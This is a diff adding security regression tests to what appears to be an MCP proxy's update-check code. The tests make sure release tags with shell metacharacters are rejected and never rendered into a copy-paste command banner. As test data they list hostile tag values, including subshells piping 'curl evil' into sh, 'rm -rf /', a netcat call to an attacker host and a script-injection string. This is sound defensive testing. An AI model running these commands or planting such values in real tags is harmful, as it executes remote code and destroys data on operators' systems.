@@ -58,6 +58,44 @@ def test_is_newer_malformed_tag_refuses():
     assert _is_newer("mastio-vX.Y.Z", "0.3.7") is False     # not numeric
 
 
+def test_parse_semver_refuses_shell_metacharacters_in_suffix():
+    """Security fix: the pre-release suffix regex used to be ``(.+)``
+    which accepted shell metacharacters. A poisoned tag like
+    ``mastio-v9.9.9-$(curl evil|sh)`` would then be rendered into
+    the "copy these commands" block of the banner template; the
+    operator pasting it would execute the subshell. The suffix is
+    now constrained to ``[A-Za-z0-9.]+``. This test asserts each
+    metacharacter family is refused at parse time."""
+    from mcp_proxy.dashboard.update_check import _parse_semver
+    poisoned = [
+        "mastio-v9.9.9-$(curl evil.com|sh)",     # subshell expansion
+        "mastio-v9.9.9-`curl evil`",             # backticks
+        "mastio-v9.9.9-rc1;rm -rf /",            # command separator
+        "mastio-v9.9.9-rc1|nc attacker 1337",    # pipe
+        "mastio-v9.9.9-\"><script>alert(1)",     # quote + bracket
+        "mastio-v9.9.9- rc1",                    # whitespace
+        "mastio-v9.9.9-rc1\nrm -rf /",           # newline (also caught by $ anchor + DOTALL off)
+    ]
+    for tag in poisoned:
+        assert _parse_semver(tag) is None, (
+            f"poisoned tag {tag!r} must NOT parse — would land in "
+            "shell-command rendering of update_banner.html"
+        )
+
+    # Realistic pre-release labels still parse.
+    legitimate = [
+        "mastio-v9.9.9-rc1",
+        "mastio-v9.9.9-rc.1",
+        "mastio-v9.9.9-alpha.2",
+        "mastio-v9.9.9-beta3",
+        "mastio-v9.9.9-dev.20260513",
+    ]
+    for tag in legitimate:
+        assert _parse_semver(tag) is not None, (
+            f"realistic pre-release {tag!r} must still parse"
+        )
+
+
 # ── status + dismiss flow ──────────────────────────────────────────────
 
 
@@ -156,6 +194,43 @@ async def test_get_update_status_refetches_after_window(
     monkeypatch.setattr(update_check, "_fetch_latest_from_github", fake_fetch)
     status = await update_check.get_update_status()
     assert status.latest == "mastio-v0.4.0"
+
+
+@pytest.mark.asyncio
+async def test_get_update_status_refuses_poisoned_cached_tag(
+    _isolated_db, monkeypatch,
+):
+    """Belt-and-suspenders: a poisoned tag that somehow landed in the
+    cache (legacy bundle with a looser regex, manual DB tampering,
+    etc.) MUST NOT surface to the template. Defence-in-depth on top
+    of the tightened ``_parse_semver``."""
+    from mcp_proxy.db import init_db, set_config
+    from mcp_proxy.dashboard import update_check
+    s = await _get_settings()
+    await init_db(s.database_url)
+
+    # Pre-seed a malicious tag directly into the cache. Mark the cache
+    # as fresh so the lazy poll does NOT overwrite it before the
+    # render call.
+    now = datetime.now(timezone.utc)
+    await set_config("update_check_last_poll_at", now.isoformat())
+    await set_config(
+        "update_check_latest_tag", "mastio-v9.9.9-$(curl evil|sh)",
+    )
+    await set_config(
+        "update_check_latest_url",
+        "https://github.com/cullis-security/cullis/releases/tag/mastio-v9.9.9",
+    )
+
+    status = await update_check.get_update_status()
+    assert status.available is False, (
+        "poisoned cached tag must not trigger the banner — belt and "
+        "suspenders defence on top of _parse_semver"
+    )
+    assert status.latest is None, (
+        "the poisoned value must be scrubbed from the response object "
+        "so a downstream caller cannot accidentally re-surface it"
+    )
 
 
 @pytest.mark.asyncio
